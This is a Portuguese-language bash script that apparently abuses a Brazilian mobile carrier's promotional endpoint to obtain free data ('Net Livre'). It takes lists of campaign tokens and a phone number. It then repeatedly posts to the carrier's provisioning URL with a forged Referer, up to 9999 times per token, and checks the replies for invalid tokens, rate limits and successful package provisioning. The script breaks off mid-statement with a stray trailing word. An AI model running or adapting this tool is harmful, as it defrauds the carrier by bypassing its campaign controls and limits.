#!/bin/bash
while :; do
clear
tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸"
echo -e $tit
echo -e "\e[01;37;41m        TESTADOR PERSONALIZADO        \e[0m"; sleep .4; echo
echo -e "\e[02;01;37m AGORA VOCÊ PODE TESTAR VÁRIOS TOKENS AO MESMO TEMPO\n exemplo:\n token1|token2|token3|token4\n USE ESTE SEPARADOR | SEM ESPAÇOS ENTRE UM E OUTRO\e[0m"; echo
echo -e "\e[01;37;41m COLE O TOKEN OU LISTA \e[0m"
   aa=$(echo -e " \e[01;37mToken:\e[0m")
      read -p "$aa" TOKENSS
      TOKENS=$(echo $TOKENSS | tr '|' '\n')
      qtdtokens=$(echo "$TOKENS"| wc -l)
echo -e "\e[01;37;41m AGORA 55+DDD+NUMERO \e[0m"
   aa=$(echo -e " \e[01;37mNumero:\e[0m")
      while :; do
       read -p "$aa" NUMERO
         limite=$(echo $NUMERO | wc -m)
              case $limite in
                     14) break;;
                      *) echo -e "\e[01;33m COLOQUE 55+DDD+NUMERO, PADRÃO 13 DIGITOS TOTAL\e[0m"
              esac
      done
sleep .2
clear; echo -e $tit
echo -e "\e[01;37;41m        TESTADOR PERSONALIZADO        \e[0m"; sleep .4; echo
echo -e "\e[07;01;37;40m NUMERO DE TOKENS   \e[01;36;40m $qtdtokens \e[0m"
echo -e "\e[07;01;37;40m NUMERO \e[01;36;40m $NUMERO \e[0m"; echo
    for o in $(seq $qtdtokens);
       do
       case $o in
          $qtdtokens) mssg=$(echo "FINALIZANDO");;
                   *) mssg=$(echo "PRÓXIMO")
       esac
VEZES=9999
tokens1=("sed '"$o"p; d'")
tokens2=$(echo "$TOKENS" | eval $tokens1)
          echo -e "\e[07;01;37;40m  T O K E N \e[01;36;40m $o \e[0m"
          echo -e "\e[01;32m TOKEN \e[01;37m: \e[0m\e[01;04;37m$tokens2\e[0m"
    for i in $(seq $VEZES);
       do
       limite1=$(echo $tokens2 | wc -m)
              case $limite1 in
                     37);;
                      *) echo -e "\e[01;33m ESSE TOKEN NÃO POSSUI O PADRÃO DE 36 CARACTERES\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break
              esac
response=$(data=$"msisdn=$NUMERO&campid=$tokens2&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess.php" && curl -s "${site}" -H "Referer: http://a.vivo.ddivulga.com/" -d "${data}")
    grepi=$(echo $response | grep -c "Invalid Campaign")
         case $grepi in
              1) echo -e "\e[01;33m TOKEN RETORNOU INVÁLIDO! TENTE OUTRO\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
              *)
         esac
     grepi2=$(echo $response | grep -c "Transaction limit exceeded")
         case $grepi2 in
              1) echo -e "\e[01;33m LIMITE DE TENTATIVAS EXCEDIDO NESTE TOKEN\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
              *)
         esac
    grepi3=$(echo $response | grep -c "Not eligible")
         case $grepi3 in
              1) echo -e "\e[01;33m TOKEN BOM! MAS O CHIP NÃO ESTÁ ELEGÍVEL NELE\e[0m / \e[01;33m$mssg\e[0m"|pv -qL 20; echo; break;;
              *)
         esac
    grepi4=$(echo $response | grep -c "packprovisionOK")
         case $grepi4 in
              1) echo -e "\e[01;32m SUCESSO SÓ ESPERAR CAIR\e[0m / \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
              *)
         esac
    done
   done
echo -e "         \e[01;37m O P Ç Õ E S \e[0m"
echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
echo -e " \e[01;37m〘*1*〙\e[0m\e[01;04;33mREPETIR PERSONALIZADO\e[0m\c"; echo -e "\e[02;03;37m Cole o(s) token(s)\e[0m"
echo -e " \e[00;31m══════════════\e[0m\e[01;37m︾\e[00;31m═══════════════\e[0m"
echo -e " \e[01;37m『*2*』\e[0m\e[01;04;33mVOLTAR PARA O MENU\e[0m\c"; echo -e "\e[02;03;37m\e[0m"
echo -e " \e[01;37m『*0*』\e[0m\e[01;04;33mSAIR DO SCRIPT\e[0m\c"; echo -e "\e[02;03;37m     Net Livre\e[0m"
echo -e " \e[00;31m═══════════════════════════════\e[0m"
    while :; do 
        veri=$(echo -e "\e[01;37m Opção: \e[0m")
        read -n1 -p "$veri" opc2; echo
              case $opc2 in
                   1) break;;
                   2) ./01;;
                   0) exit;;
                   *) echo -e "\e[01;37;41m CALMA AMIGO \e[0m"; sleep 1
              NETLIVRE
